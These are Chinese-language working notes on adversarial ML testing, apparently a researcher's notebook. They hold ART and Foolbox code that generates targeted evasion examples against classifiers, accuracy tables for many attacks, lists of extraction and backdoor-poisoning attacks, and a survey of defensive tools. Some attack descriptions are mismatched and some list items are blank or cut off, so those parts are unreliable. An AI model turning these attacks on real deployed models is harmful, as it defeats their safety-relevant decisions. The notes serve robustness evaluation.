解決方案：暫時無法解決。


##### code(階段性)

###### 變數說明
yrej_ts：

這是測試集的標籤或目標變數。在監督學習中，yrej_ts 通常用於評估模型的預測性能，即將模型的預測結果與 yrej_ts 進行比較以計算準確率或其他性能指標。
Xts：

這是測試集的特徵數據。在機器學習中，Xts 包含了用於模型預測的輸入數據。通常在模型訓練完成後，使用 Xts 來評估模型在未知數據上的表現。
y_pred：

這是模型對測試集 Xts 的預測結果。y_pred 通常用於與 yrej_ts 進行比較，以評估模型的準確性和其他相關的性能指標。
x_test_adv：

這是經過對抗性攻擊後生成的對抗性樣本。這些樣本用於測試模型在面對經過特別製造的攻擊（例如干擾輸入數據）時的韌性。
y_targets：

這是用於定向對抗性攻擊的目標標籤。在定向攻擊中，y_targets 代表攻擊者希望模型將輸入數據錯誤分類為的類別。
x_test_subset：

這是從原始測試集 Xts 中選取的一個子集，用於進行對抗性攻擊。在您的代碼中，它是從 Xts 中選取的前 100 個樣本。
y_target_subset：

這是與 x_test_subset 相對應的目標標籤子集，用於定向對抗性攻擊。它是從 y_targets 中選取的與 x_test_subset 相對應的部分。

```python!
from sklearn.preprocessing import LabelEncoder
import numpy as np
from sklearn.model_selection import cross_validate
from sklearn.metrics import accuracy_score

# 確認 yrej_ts 的類型並適當轉換
# 檢查 yrej_ts 是否為整數類型 (dtype.kind in 'iu' 意味著數據是整數)
if yrej_ts.dtype.kind in 'iu':  
    yrej_ts = yrej_ts.astype(str)  # 將整數類型轉換為字符串類型

# 使用 LabelEncoder 對標籤進行編碼
label_encoder = LabelEncoder()
y_integers = label_encoder.fit_transform(yrej_ts)

# 生成目標標籤，用於定向攻擊
# 變換標籤，使每個類別的標籤改變，以進行定向攻擊
num_classes = len(label_encoder.classes_)  # 獲取標籤的類別數
y_targets = label_encoder.inverse_transform((y_integers + 1) % num_classes)

# 初始化 Boundary Attack，設定攻擊參數
# targeted=True 表示進行定向攻擊
# max_iter 和 num_trial 控制攻擊的迭代次數和每次迭代的嘗試次數
attack = BoundaryAttack(estimator=model_art, targeted=True, max_iter=10, num_trial=5)

# 選擇部分測試樣本進行攻擊
# 這裡僅選取測試集中的前 100 個樣本進行攻擊
x_test_subset = Xts.to_numpy()[:100]
y_target_subset = label_encoder.transform(y_targets)[:100]

# 生成對抗性樣本
x_test_adv = attack.generate(x=x_test_subset, y=y_target_subset)

# 使用 rejclf 在對抗性樣本上進行評估
# 計算對抗性樣本的預測準確率
predictions_adv = rejclf.predict(x_test_adv)
accuracy_adv = np.mean(predictions_adv == yrej_ts[:100])
print("對抗樣本的準確率: {:.2f}%".format(accuracy_adv * 100))

```
##### 準確率比較
* 未攻擊前
![image](https://hackmd.io/_uploads/B1XWuAV9a.png)

* boundary
![image](https://hackmd.io/_uploads/Hk2rO0VqT.png)

* zooattack
![image](https://hackmd.io/_uploads/BJ_Nh0V9a.png)

DeepFool 攻擊需要能夠計算類別梯度（class gradients），而標準的 Scikit-learn 分類器不支持這種操作。

FGSM 因為 FGSM 需要計算損失梯度，而標準的 Scikit-learn 分類器不提供這種功能。

ZooAttack 80




* 目的：測量對抗性樣本對模型準確性的影響。
* 主要動作：計算對抗性樣本的預測準確率和平均擾動程度。

![image](https://hackmd.io/_uploads/HJFfuDVHa.png)

| 攻擊類型 | 使用的攻擊方法 | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 備註 |
|----------|----------------|-------------------|-----------------|------|
| 逃避     | Projected Gradient Descent | 98.1 | 1.98 | 顯著降低準確率 |
| 提取     | Copycat CNN | 97.87 | 81.94 | 略微降低準確率 |
| 投毒     | Backdoor Attack | - | - | 準確率可能不變或提高，取決於攻擊目標與原始標籤的一致性、數據集增強效果、過擬合，以及評估方法 |
| 推論     | Membership Inference (或其他) | - | - | 通常不影響模型的準確率，因為推論攻擊的目標是揭露訓練數據的隱私信息，而不是直接影響模型的預測性能 |

| 使用的攻擊方法                    | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 平均擾動幅度 | 攻擊內容 |
|-----------------------------------|-------------------|-----------------|------------|---------|
| AutoAttack                        | 93.69             | 0               | 0.16       | 結合了多種不同的攻擊方法。它包括兩種自動調整參數的PGD版本（APGDCE和APGDDLR）、FAB攻擊和Square Attack，形成一個無需設定自由參數的攻擊組合。這種多元化的攻擊策略使得AutoAttack在機器學習模型的安全性評估中非常有效，因為它能夠揭示模型在不同攻擊策略下的潛在弱點。此外，AutoAttack的運行完全自動化，無需任何超參數調整，能夠可靠且成本高效地評估對抗性魯棒性。|
AutoConjugateGradient             | 93.69             | 10              | 0.16       | AutoConjugateGradient 一種特殊的圖像貼片，當這種貼片被放置在物體上時，能夠欺騙神經網絡的圖像識別系統。這些貼片設計成在不同的物理環境下都能有效，並且能夠讓機器學習模型錯誤地將視覺物體分類為特定的錯誤類別。這項技術的關鍵在於創造一種對神經網絡來說非常顯著，但對人類觀察者不易察覺的圖像模式，從而在不被人注意的情況下進行有效的攻擊。 |
|Shadow attack|93.69|10|0.14|為了轉移對抗性攻擊，人們提出了一系列「經過認證的」分類器。除了標記影像之外，經過認證的分類器還會（如果可能）產生一個證書，確保輸入影像不是ℓp-有界對抗性例子。我們提出了一種新的攻擊，它不僅利用分類器的標籤功能，還利用憑證產生器。所提出的方法應用大擾動，使影像遠離類邊界，同時保持對抗性示例的不​​可察覺性。建議的「影子攻擊」會導致可證明穩健的網路對影像進行錯誤標記，並同時產生「欺騙」的穩健性憑證。|
|Wasserstein|93.69|80|0.14|一個快速增長的工作領域研究了對抗性示例的存在，這些數據點被擾動以愚弄分類器，但這些工作中的絕大多數主要集中在由ℓp範數有界的擾動。在本文中，我們提出了一個基於 Wasserstein 距離的對抗性攻擊的新威脅模型。在影像分類設定中，此類距離測量移動像素品質的成本，這自然涵蓋「標準」影像操作，例如縮放、旋轉、平移和失真（也可能應用於其他設定）。為了產生 Wasserstein 對抗樣本，我們基於 Sinkhorn 迭代的修改版本開發了一個投影到 Wasserstein 球上的程式。由此產生的演算法可以成功地攻擊影像分類模型，使傳統的CIFAR10 模型在半徑為0.1 的Wasserstein 球內的準確率降至3%（即，將影像品質的10% 移動1 像素），並且我們證明基於PGD 的對抗訓練可以將對抗準確率提高到 76%。總的來說，這項工作開闢了對抗穩健性的新研究方向，更正式地考慮凸度量，這些度量準確地捕捉了我們通常認為應該存在於分類器中的不變性。本文中所有實驗的程式碼都可以在此 https URL中找到。
|PE Malware Attacks|93.69|x|x|需要特殊訓練集
|Imperceptible, Robust, and Targeted Adversarial Examples for Automatic Speech Recognition|93.69|x|x|在ART官網找不到|
|Brendel & Bethge Attack|93.69|x|x|沒有
|Audio Adversarial Examples: Targeted Attacks on Speech-to-Text|93.69|x|x|
|High Confidence Low Uncertainty Attack|93.69|x|x|
|Dpatch|93.69|x|x|
|RobustDPatch|93.69|50|0.01|在本文中，我們演示了針對目標檢測器（特別是 YOLOv3 檢測器）的物理對抗性補丁攻擊。與之前關於物理物件檢測攻擊的工作不同，物理物件檢測攻擊要求補丁與被錯誤分類或避免檢測的物件重疊，我們表明，設計得當的補丁幾乎可以抑制圖像中所有檢測到的物件。也就是說，我們可以將貼片放置在圖像中的任何位置，從而使檢測器完全錯過圖像中的所有現有物體，即使是那些遠離貼片本身的物體。這反過來又開闢了針對物件檢測系統的新物理攻擊線，這些系統不需要修改場景中的物件。可以在此 HTTPs URL 中找到系統的演示。
ProjectedGradientDescent          | 93.69             | 10              | 0.11       | Projected Gradient Descent 是一種迭代式的對抗性攻擊方法，被認為是 FGSM 的擴展版本。它通過多次應用梯度上升（針對損失函數）和投影步驟來精細調整對抗性範例。每一次迭代都稍微調整擾動，並確保範例在預定的攻擊範圍內。PGD 透過這種逐步逼近的策略，生成能夠有效欺騙模型的對抗性範例。 |
|ElasticNet|93.69|60|0.02|最近的研究強調了深度神經網路 （DNN） 對對抗性示例的脆弱性——可以很容易地製作視覺上無法區分的對抗性圖像，以導致訓練有素的模型進行錯誤分類。製作對抗性示例的現有方法基於和L_\infty 失真指標。然而，儘管L_1失真解釋了總變化並鼓勵了擾動的稀疏性，但對於製作基於L_1的對抗性示例的研究卻很少。在本文中，我們將通過對抗性示例攻擊 DNN 的過程表述為彈性網路正則化優化問題。我們對 DNN 的彈性網路攻擊 （EAD） 以面向L_1的對抗性示例為特色，並將最先進的 L_2 攻擊作為特例。在MNIST、CIFAR10和ImageNet上的實驗結果表明，EAD可以產生一組獨特的對抗樣本，L_1失真較小，並且在不同的攻擊場景中獲得了與最先進的方法相似的攻擊性能。更重要的是，EAD 提高了攻擊可轉移性，並補充了 DNN 的對抗性訓練，為利用對抗性機器學習中的L_1失真和 DNN 的安全影響提出了新的見解
|AdversarialPatch|95.62|X|X|我們提出了一種在現實世界中創建通用、穩健、有針對性的對抗性圖像補丁的方法。這些補丁是通用的，因為它們可以用來攻擊任何場景，健壯的，因為它們可以在各種轉換下工作，並且是有針對性的，因為它們可以使分類器輸出任何目標類。這些對抗性補丁可以列印、添加到任何場景中、拍照並呈現給圖像分類器;即使補丁很小，它們也會導致分類器忽略場景中的其他專案並報告所選的目標類。為了重現論文的結果，我們的代碼可從以下 HTTPs URL 獲得
|DecisionTreeClassifier|95.62|1.41|X|許多機器學習模型容易受到對抗性示例的影響：專門設計的輸入會導致機器學習模型產生不正確的輸出。影響一個模型的對抗性示例通常會影響另一個模型，即使兩個模型具有不同的架構或在不同的訓練集上進行訓練，只要兩個模型都經過訓練以執行相同的任務。因此，攻擊者可以訓練自己的替代模型，製作針對替代模型的對抗性示例，並將它們轉移到受害者模型中，而關於受害者的資訊很少。最近的工作進一步發展了一種技術，該技術使用受害者模型作為預言機來標記替代者的合成訓練集，因此攻擊者甚至不需要收集訓練集來發起攻擊。我們使用儲層採樣擴展了這些最新技術，以大大提高替代模型訓練過程的效率。我們在以前未探索的（替代、受害者）機器學習模型類對之間引入了新的可轉移性攻擊，最著名的是 SVM 和決策樹。我們僅使用800個受害者模型的查詢，演示了我們對亞馬遜（96.19%錯誤分類率）和谷歌（88.94%）的兩個商業機器學習分類系統的攻擊，從而表明現有的機器學習方法通常容易受到系統性黑盒攻擊，無論其結構如何。
|C&W L_2|95.62|97|X|神經網路為大多數機器學習任務提供了最先進的結果。不幸的是，神經網路容易受到對抗性示例的影響：給定輸入x和任何目標分類t，則可以找到新的輸入x′這類似於x但歸類為t.這使得在安全關鍵領域應用神經網路變得困難。防禦性蒸餾是最近提出的一種方法，它可以採用任意神經網路，並增加其魯棒性，從而降低當前攻擊從中查找對抗性示例的能力的成功率95%自0.5%.在本文中，我們通過引入三種新的攻擊演算法來證明防禦性蒸餾不會顯著提高神經網路的魯棒性，這些演算法在蒸餾和未蒸餾神經網路上都取得了成功100%概率。我們的攻擊是針對文獻中先前使用的三個距離指標量身定製的，與以前的對抗性示例生成演算法相比，我們的攻擊通常更有效（而且從不更糟）。此外，我們建議在一個簡單的可轉移性測試中使用高置信度對抗性示例，我們證明也可以用來打破防禦性蒸餾。我們希望我們的攻擊將被用作未來防禦嘗試的基準，以創建抵抗對抗性示例的神經網路。
|BasicIterativeMethod|95.62|3|X|大多數現有的機器學習分類器都非常容易受到對抗性示例的影響。對抗性示例是輸入數據的樣本，該樣本經過了非常輕微的修改，旨在導致機器學習分類器對其進行錯誤分類。在許多情況下，這些修改可能非常微妙，以至於人類觀察者甚至根本沒有注意到這些修改，但分類器仍然會犯錯誤。對抗性示例會帶來安全問題，因為它們可用於對機器學習系統執行攻擊，即使攻擊者無法訪問基礎模型。到目前為止，之前的所有工作都假設了一個威脅模型，在該模型中，攻擊者可以將數據直接輸入機器學習分類器。對於在物理世界中運行的系統來說，情況並非總是如此，例如那些使用來自攝像頭和其他感測器的信號作為輸入的系統。本文表明，即使在這樣的物理場景中，機器學習系統也容易受到對抗性示例的影響。我們通過將從手機攝像頭獲得的對抗圖像提供給 ImageNet Inception 分類器並測量系統的分類精度來證明這一點。我們發現，即使通過相機感知，很大一部分對抗性示例也被錯誤地分類。
|SaliencyMapMethod|95.62|0|X|深度學習利用大型數據集和計算效率高的訓練演算法，在各種機器學習任務中優於其他方法。然而，深度神經網路訓練階段的缺陷使它們容易受到對抗性樣本的影響：由對手精心製作的輸入，目的是導致深度神經網路錯誤分類。在這項工作中，我們將對手與深度神經網路（DNN）的空間形式化，並引入了一類新的演算法，以基於對DNN輸入和輸出之間映射的精確理解來製作對抗樣本。在計算機視覺的應用中，我們表明，我們的演算法可以可靠地生成由人類受試者正確分類的樣本，但被 DNN 錯誤分類為特定目標，對抗成功率為 97%，而平均僅修改每個樣本 4.02% 的輸入特徵。然後，我們通過定義硬度測量來評估不同樣品類別對對抗性擾動的脆弱性。最後，我們描述了初步工作，通過定義良性輸入和目標分類之間距離的預測度量來概述對對抗性樣本的防禦。
|UniversalPerturbation|95.62|7|X|深度神經網路 （DNN） 容易受到對抗性攻擊。特別是，稱為通用對抗擾動 （UAP） 的單個擾動可以挫敗 DNN 執行的大多數分類任務。因此，需要不同的方法來生成UAP，以全面評估 DNN 的脆弱性。一個現實的評估是考慮有針對性的攻擊的案件;其中，生成的UAP導致 DNN 將輸入分類到特定類中。然而，用於針對性攻擊的UAP的發展在很大程度上落後於用於非針對性攻擊的UAP。因此，我們提出了一種簡單的反覆運算方法來生成針對性攻擊的UAP。我們的方法結合了用於生成非目標 UAP 的簡單反覆運算方法和用於為輸入生成目標對抗擾動的快速梯度符號方法。我們將所提出的方法應用於最先進的 DNN 模型進行圖像分類，並證明瞭存在幾乎難以察覺的針對性攻擊的 UAP;此外，我們證明瞭這種UAP很容易生成。
|FeatureAdversariesNumpy|95.62|太久|X
|DeepFool|93.69|10|0.01|DeepFool 是一種對抗性攻擊方法，旨在有效地找到模型分類錯誤的最小擾動。它透過迭代過程逼近模型的決策邊界，並計算將輸入數據推向該邊界的最小擾動。每次迭代中，DeepFool 估計多類別分類器的決策邊界，然後更新輸入數據以更接近這些邊界。這種方法特別高效，因為它直接針對模型的弱點，生成在人類感知上幾乎不可察覺但對模型卻高度有效的微小擾動。DeepFool 在尋找對抗性範例時注重精確度和效率，使其成為一種強大的工具來測試和改進機器學習模型的魯棒性。
|Virtual Adversarial Method|95.62|太久|X
|SquareAttack|95.62|11|x|我們提出了Square Attack，這是一種基於分數的黑盒和l_\infty-adversarial攻擊，它不依賴於局部梯度資訊，因此不受梯度掩蔽的影響。Square Attack 基於隨機搜索方案，該方案在隨機位置選擇局部的方形更新，以便在每次反覆運算時擾動大致位於可行集的邊界處。與最先進的方法相比，我們的方法的查詢效率明顯更高，成功率更高，尤其是在非靶向環境中。特別是，在ImageNet上，與Al-Dujaili和O'Reilly最近最先進的l_\infty攻擊相比，我們將各種深度網路在非目標設置中的平均查詢效率提高了至少1.8倍，最高可達3倍。此外，雖然我們的攻擊是黑盒攻擊，但它也可以在標準基準測試上勝過基於梯度的白盒攻擊，在成功率方面達到了新的水準。我們的攻擊代碼可在此 HTTPs URL 上找到。
|HopSkipJump|95.62|10|X|對經過訓練的模型進行基於決策的對抗性攻擊的目標是僅根據觀察目標模型返回的輸出標籤來生成對抗性示例。我們開發了 HopSkipJumpAttack，這是一系列基於在決策邊界使用二進位資訊對梯度方向進行新估計的演算法。擬議的系列包括針對以下目標優化的非針對性和針對性攻擊ℓ2和ℓ∞相似性指標。對所提演算法和梯度方向估計進行了理論分析。實驗表明，與邊界攻擊相比，HopSkipJumpAttack 需要的模型查詢要少得多。它還在攻擊幾種廣泛使用的防禦機制方面取得了競爭性能。（HopSkipJumpAttack 在預印本的先前版本中被命名為 Boundary Attack++。
|PixelAttack|95.62|0|x|各種類型的機器學習演算法存在大量的對抗性攻擊和防禦，這使得評估演算法的魯棒性成為一項艱巨的任務。更糟糕的是，這些對抗性演算法存在內在偏見。在這裡，我們組織了面臨的問題：a）模型依賴性，b）評估不足，c）虛假對抗樣本，以及d）擾動依賴性結果）。基於此，我們提出了一種與模型無關的雙重質量評估方法，以及魯棒性水準的概念來解決這些問題。我們驗證了最先進的神經網路（WideResNet、ResNet、AllConv、DenseNet、NIN、LeNet 和 CapsNet）的雙重質量評估以及圖像分類問題的對抗防禦。我們進一步表明，當前的網路和防禦在各個級別的魯棒性上都是脆弱的。建議的穩健性評估表明，根據所使用的指標（即L0或L∞），魯棒性可能會有很大差異。因此，為了正確評估，應考慮二元性。此外，數學推導以及反例表明L1和L2僅靠指標不足以避免虛假的對抗性樣本。有趣的是，所提出的評估的閾值攻擊是一種新穎的L∞黑匣子對抗方法，需要比單圖元攻擊更少的擾動（僅12%One-Pixel Attack 的擾動量）以達到類似的結果。代碼可在此 HTTP URL 中找到。
|ThresholdAttack|95.62|太久|X|
|SimBA|95.62|太久|X
FGSM                              | 93.69             | 0               | 0.16       | FGSM 是一種快速且高效的對抗性攻擊方法，由 Ian Goodfellow 等人提出。它透過計算輸入數據對模型損失的梯度，並使用這些梯度的符號來創建小的、有方向的擾動。這些擾動加到原始輸入上，以使模型做出錯誤的預測。FGSM 的關鍵優勢在於其簡潔和快速，通常只需要一次梯度更新即可生成對抗性範例，使其成為評估模型魯棒性的常用工具。 |
| CarliniLInfMethod                 | 93.69             | 10              | 0.03       | Carlini & Wagner L-Infinity Method 是一種高度精確的對抗性攻擊技術。它優化了一個特定的目標函數，不僅考慮了模型輸出和目標輸出之間的差異，還確保了對抗性範例和原始輸入之間的最大偏差在預定的範數限制內。這種方法通過精細調整擾動來找到幾乎不被人類察覺的對抗性範例，從而有效地欺騙機器學習模型。 |
| 
|FeatureAdversariesNumpy|93.69|x|x|
|Boundary Attack|93.69|50|x|許多機器學習演算法容易受到其輸入幾乎難以察覺的擾動的影響。到目前為止，尚不清楚對抗性擾動對真實世界機器學習應用程式的安全性有多大風險，因為用於生成此類擾動的大多數方法要麼依賴於詳細的模型資訊（基於梯度的攻擊），要麼依賴於置信度分數，例如類概率（基於分數的攻擊），這兩種方法在大多數現實世界的場景中都不可用。在許多情況下，人們目前需要退回到基於轉移的攻擊，這些攻擊依賴於繁瑣的替代模型，需要訪問訓練數據並且可以防禦。在這裡，我們強調攻擊的重要性，這些攻擊完全依賴於最的模型決策。這種基於決策的攻擊（1）適用於現實世界的黑匣子模型，如自動駕駛汽車，（2）比基於轉移的攻擊需要更少的知識，更容易應用，（3）比基於梯度或分數的攻擊更適用於簡單的防禦。以前此類攻擊僅限於簡單模型或簡單數據集。在這裡，我們介紹邊界攻擊，這是一種基於決策的攻擊，它從大型對抗性擾動開始，然後尋求在保持對抗性的同時減少擾動。該攻擊在概念上很簡單，幾乎不需要超參數調整，不依賴於替代模型，並且與標準計算機視覺任務（如 ImageNet）中最好的基於梯度的攻擊具有競爭力。我們從這個 HTTP URL 對兩個黑盒演算法進行攻擊。特別是邊界攻擊和一般的基於決策的攻擊類別，為研究機器學習模型的魯棒性開闢了新的途徑，並提出了有關已部署機器學習系統安全性的新問題。該攻擊的實現可作為 Foolbox 的一部分，位於此 https URL 。






每個攻擊手法都有不同參數使用方Dpatch [doc](https://adversarial-robustness-toolbox.readthedocs.io/en/latest/modules/attacks/evasion.html)

evasion攻擊手法
1. **Adversarial Patch**: 這種攻擊涉及創建一個對抗性貼片，當貼在圖像上時，能夠誤導機器學習模型的預測。

2. **Adversarial Patch - Numpy**: 這是 Adversarial Patch 攻擊的 Numpy 版本，適用於方形和矩形圖像。

3. **Adversarial Patch - PyTorch**: 這是 Adversarial Patch 攻擊的 PyTorch 版本，支持對貼片進行不同的轉換。

4. **Adversarial Patch - TensorFlowV2**: 這是 Adversarial Patch 攻擊的 TensorFlow v2 版本，也支持多種貼片轉換。

5. **Adversarial Texture - PyTorch**: 這是一種針對物體追蹤器的對抗性紋理攻擊，在 PyTorch 中實現。

6. **Auto Attack**: 這是一種自動化的攻擊方法，它結合了多種攻擊策略來找到最有效的對抗性範例。

7. **Auto Projected Gradient Descent (Auto-PGD)**: 這是一種自動化的投影梯度下降攻擊，用於生成對抗性範例。

8. **Auto Conjugate Gradient (Auto-CG)**: 這是一種基於共軛梯度方法的自動化攻擊。

9. **Boundary Attack / Decision-Based Attack**: 這種攻擊方法不需要梯度資訊，而是通過探索決策邊界來生成對抗性範例。

10. **Brendel and Bethge Attack**: 這是一種基於決策邊界的攻擊，它從原始範例開始，逐步逼近決策邊界。

11. **Carlini and Wagner L_0 Attack**: 這是 Carlini 和 Wagner 提出的一種攻擊，目標是改變最少數量的輸入特徵。

12. **Carlini and Wagner L_2 Attack**: 這是 Carlini 和 Wagner 提出的另一種攻擊，旨在最小化輸入變化的 L2 範數。

13. **Carlini and Wagner L_inf Attack**: 這是 Carlini 和 Wagner 提出的第三種攻擊，旨在最小化輸入變化的 L∞ 範數。

14. **Carlini and Wagner ASR Attack**: 這是針對自動語音識別系統的攻擊。

15. **





**: 這是針對決策樹模型的攻擊。

16. **DeepFool**: 這是一種高效的攻擊方法，旨在找到最小的擾動，使模型的預測發生變化。

17. **DPatch**: 這是一種針對物體檢測系統的攻擊，通過在圖像中添加一個小的對抗性貼片來誤導檢測。

18. **RobustDPatch**: 這是 DPatch 的一個變體，旨在提高對抗性貼片的穩健性。

19. **Elastic Net Attack**: 這是一種結合 L1 和 L2 正則化的攻擊方法。

20. **Fast Gradient Method (FGM)**: 這是一種快速的梯度攻擊方法，通過利用輸入對損失的梯度來生成對抗性範例。

21. **Feature Adversaries - Numpy**: 這種攻擊旨在改變模型的內部特徵表示，而不是直接針對輸出標籤。

22. **Feature Adversaries - PyTorch**: 這是 Feature Adversaries 攻擊的 PyTorch 實現。

23. **Feature Adversaries - TensorFlow**: 這是 Feature Adversaries 攻擊的 TensorFlow 實現。

24. **Frame Saliency Attack**: 這種攻擊利用影像中的顯著性區域來生成對抗性範例。

25. **Geometric Decision Based Attack**: 這是一種基於幾何決策的攻擊，不依賴於梯度資訊。

26. **GRAPHITE - Blackbox**: 這是一種黑盒攻擊，不需要知道模型的內部結構或參數。

27. **GRAPHITE - Whitebox - PyTorch**: 這是 GRAPHITE 攻擊的白盒版本，針對 PyTorch 模型。

28. **High Confidence Low Uncertainty Attack**: 這種攻擊生成高信心但低不確定性的對抗性範例。

29. **HopSkipJump Attack**: 這是一種基於邊界的攻擊，不需要梯度資訊。

30. **Imperceptible ASR Attack**: 這是針對自動語音識別系統的對抗性攻擊，生成難以察覺的對抗性語

##### ART `extraction` 模組攻擊手法

1. **Copycat CNN**: 利用從目標模型獲得的輸出來訓練一個新的模型，目的是複製目標模型的功能。不需要知道目標模型的內部結構或參數。

2. **Functionally Equivalent Extraction (FEE)**: 從目標模型中提取一個功能上等價的模型。這種攻擊通過比較目標模型和提取模型的輸出來進行。

3. **Knockoff Nets**: 使用從目標模型獲得的預測來訓練一個新的模型，從而複製目標模型的行為。不需要對目標模型進行任何修改。

##### ART `poisoning` 模組攻擊手法

1. **Backdoor Attack DGM ReD**: 這種攻擊使用深度生成模型 (DGM) 和隨機彈性變形 (ReD) 來創建後門攻擊。

2. **Backdoor Attack DGM Trail**: 利用深度生成模型 (DGM) 和軌跡技術來實施後門攻擊。

3. **Adversarial Embedding Attack**: 這種攻擊通過嵌入對抗性信息到訓練數據中來污染模型。

4. **Backdoor Poisoning Attack**: 這是一種後門污染攻擊，通過在訓練數據中加入特定的後門樣本來影響模型的行為。

5. **Hidden Trigger Backdoor Attack**: 這種攻擊在訓練數據中隱藏觸發器，當模型遇到含有這些觸發器的輸入時，會產生錯誤的預測。

6. **Bullseye Polytope Attack**: 這種攻擊創建一個多面體區域，當模型的訓練數據落入這個區域時，會導致模型的預測偏差。

7. **Clean Label Backdoor Attack**: 這是一種後門攻擊，其中污染的樣本保持其原始標籤，使攻擊更難被察覺。

8. **Feature Collision Attack**: 利用特徵碰撞技術來生成污染樣本。這些樣本在特徵空間中與目標樣本相似，但在像素空間中看起來不同。

9. **Gradient Matching Attack**: 這種攻擊通過匹配梯度分佈來生成污染樣本，從而影響模型的訓練過程。

10. **Poisoning SVM Attack**: 這是針對支持向量機 (SVM) 模型的污染攻擊，通過修改訓練數據來影響模型的決策邊界。

11. **Sleeper Agent Attack**: 這種攻擊創建“睡眠代理”，在特定條件下激活，從而影響模型的預測。


![](https://hackmd.io/_uploads/H1f9teMX6.png)


- [ModelScan](https://github.com/Azure/counterfit/)
ML Model Serialization Attacks.**模型序列化攻擊是指模型保存時，加上惡意程式碼，導致使用者在加載模型時運行惡意程式，modelscan透過掃描模型字節內容，確認安全性。**

    **模型序列化攻擊可用於執行：**
    >***認證盜竊（用於向環境中的其他系統寫入和讀取資料的雲憑據）
    資料盜竊（發送給模型的請求）
    資料中毒（模型執行工作後傳送的資料 ）
    模型中毒（改變模型本身的結果）***
- [NB Defense](https://nbdefense.ai) - Jupyter Notebooks. &CLI

    >**[操作教學(Announcing NB Defense: The Starting Point of ML Security)](https://protectai.com/blog/announcing-nb-defense)** 
    >**[操作教學(NB Getting started)](https://nbdefense.ai/getting-started/)**  
    >**[操作教學(github)](https://github.com/protectai/nbdefense)**
- [Garak](https://github.com/leondz/garak) -  LLM 漏洞掃描器。.
**目前用於LLM模型上，所支援的LLM有以下這些**
    >[Hugging face hub generative models](https://huggingface.co/models)
    [replicate](https://replicate.com/) text models
    [openai api](https://platform.openai.com/docs/introduction) chat & continuation models
    ggml models like [llama.cpp](https://github.com/ggerganov/llama.cpp)
- [Adversarial Robustness Toolbox](https://github.com/IBM/adversarial-robustness-toolbox) - 機器學習模型對抗對抗性攻擊的防禦方法庫。
   >* **[ART example](https://github.com/Trusted-AI/adversarial-robustness-toolbox/blob/main/examples/README.md)**
    >* **[ART使用教學](https://www.cnblogs.com/bonelee/p/16399758.html)**
    >* **[ART攻擊種類](https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/ART-Attacks)**
    >>* Evasion Attacks
    >>* Poisoning Attacks
    >>* Extraction Attacks
    >>* Inference Attacks

- [MLSploit](https://github.com/mlsploit/) - MLsploit 是一個用於對抗性機器學習研究互動式實驗的雲端框架。
    >**[MLsploit](https://mlsploit.github.io/) 是第一個使用者友好、基於雲的系統，使研究人員和從業者能夠快速評估和比較機器學習 （ML） 模型的最先進的對抗性攻擊和防禦。**
- [TensorFlow Privacy](https://github.com/tensorflow/privacy) - 隱私保護機器學習演算法和工具庫。
- [Foolbox](https://github.com/bethgelab/foolbox) - 用於建立和評估對抗性攻擊和防禦的 Python 工具箱。.
#### 安裝建置
```
!pip install foolbox
```
    
#### demo
```python
#!/usr/bin/env python3
import torchvision.models as models
import eagerpy as ep
from foolbox import PyTorchModel, accuracy, samples
import foolbox.attacks as fa
import numpy as np

if __name__ == "__main__":
    # 實例化一個模型（也可以是 TensorFlow 或 JAX 模型）
    model = models.resnet18(pretrained=True).eval()
    preprocessing = dict(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225], axis=-3)
    fmodel = PyTorchModel(model, bounds=(0, 1), preprocessing=preprocessing)

    # 獲取數據並測試模型
    # 使用 ep.astensors 包裝張量是可選的，但它允許我們在後續操作中使用 EagerPy 張量
    images, labels = ep.astensors(*samples(fmodel, dataset="imagenet", batchsize=16))
    clean_acc = accuracy(fmodel, images, labels)
    print(f"原始準確率:  {clean_acc * 100:.1f} %")
    print("")

    # 定義攻擊方法列表
    attacks = [
        fa.FGSM(),
        fa.LinfPGD(),
        fa.LinfBasicIterativeAttack(),
        fa.LinfAdditiveUniformNoiseAttack(),
        fa.LinfDeepFoolAttack(),
    ]

    # 定義 epsilon 值列表
    epsilons = [
        0.0,
        0.0005,
        0.001,
        0.0015,
        0.002,
        0.003,
        0.005,
        0.01,
        0.02,
        0.03,
        0.1,
        0.3,
        0.5,
        1.0,
    ]
    print("epsilons")
    print(epsilons)
    print("")

    # 計算每種攻擊在不同 epsilon 下的成功率
    attack_success = np.zeros((len(attacks), len(epsilons), len(images)), dtype=np.bool)
    for i, attack in enumerate(attacks):
        _, _, success = attack(fmodel, images, labels, epsilons=epsilons)
        assert success.shape == (len(epsilons), len(images))
        success_ = success.numpy()
        assert success_.dtype == np.bool
        attack_success[i] = success_
        print(attack)
        print("  ", 1.0 - success_.mean(axis=-1).round(2))

    # 計算並報告在受攻擊時的模型魯棒準確率（使用每個樣本的最佳攻擊）
    robust_accuracy = 1.0 - attack_success.max(axis=0).mean(axis=-1)
    print("")
    print("-" * 79)
    print("")
    print("最壞情況（每個樣本的最佳攻擊）")
    print("  ", robust_accuracy.round(2))
    print("")

    # 報告不同擾動下的魯棒準確率
    print("對於以下擾動的魯棒準確率")
    for eps, acc in zip(epsilons, robust_accuracy):
        print(f"  Linf 範數 ≤ {eps:<6}: {acc.item() * 100:4.1f} %")

```
![image](https://hackmd.io/_uploads/Hyi7vaSHT.png)

- [Advertorch](https://github.com/BorealisAI/advertorch) -  用於adversarial robustness 研究的 Python 工具箱。
- [Artificial Intelligence Threat Matrix](https://collaborativeaicontrols.github.io/ATM/) - 用於識別和減輕機器學習系統威脅的框架。
- [Adversarial ML Threat Matrix](https://github.com/mitre/advmlthreatmatrix) -Adversarial Machine Learning Threat Matrix ([ATLAS](https://www.mitre.org/news-insights/impact-story/mitre-microsoft-and-11-other-organizations-take-machine-learning-threats))基於mitre框架
    >[針對機器學習系統的網路攻擊比您想像的更常見](https://www.microsoft.com/en-us/security/blog/2020/10/22/cyberattacks-against-machine-learning-systems-are-more-common-than-you-think/)
    >[Atlas github](https://github.com/mitre/advmlthreatmatrix)
- [CleverHans](https://github.com/cleverhans-lab/cleverhans) - 機器學習模型的對抗性範例和防禦庫
- [AdvBox](https://github.com/advboxes/AdvBox) - Advbox is a toolbox to generate adversarial examples that fool neural networks in PaddlePaddle、PyTorch、Caffe2、MxNet、Keras、TensorFlow.
- [Audit AI](https://github.com/pymetrics/audit-ai) - Bias Testing for Generalized Machine Learning Applications.
